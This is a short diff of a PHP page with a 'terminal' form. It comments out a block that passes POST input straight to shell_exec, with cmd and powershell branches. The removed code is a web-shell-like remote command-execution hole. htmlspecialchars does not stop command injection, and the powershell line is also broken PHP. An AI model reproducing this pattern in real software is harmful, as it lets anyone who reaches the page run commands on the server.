@@ -71,16 +71,16 @@
         </form>
         <div class="result">
             <?php
-                if ($_SERVER["REQUEST_METHOD"] == "POST") {
-                    if($_POST['terminal'] == "cmd"){
-                        $command = htmlspecialchars($_POST['input_text']);
-                        shell_exec($command);
-                    }
-                    if($_POST['terminal'] == "powershell") {
-                        $command = htmlspecialchars($_POST['input_text']);
-                        shell_exec("powershell.exe" + $command);
-                    }
-                }
+                // if ($_SERVER["REQUEST_METHOD"] == "POST") {
+                //     if($_POST['terminal'] == "cmd"){
+                //         $command = htmlspecialchars($_POST['input_text']);
+                //         shell_exec($command);
+                //     }
+                //     if($_POST['terminal'] == "powershell") {
+                //         $command = htmlspecialchars($_POST['input_text']);
+                //         shell_exec("powershell.exe" + $command);
+                //     }
+                // }
             ?>
         </div>
     </div>
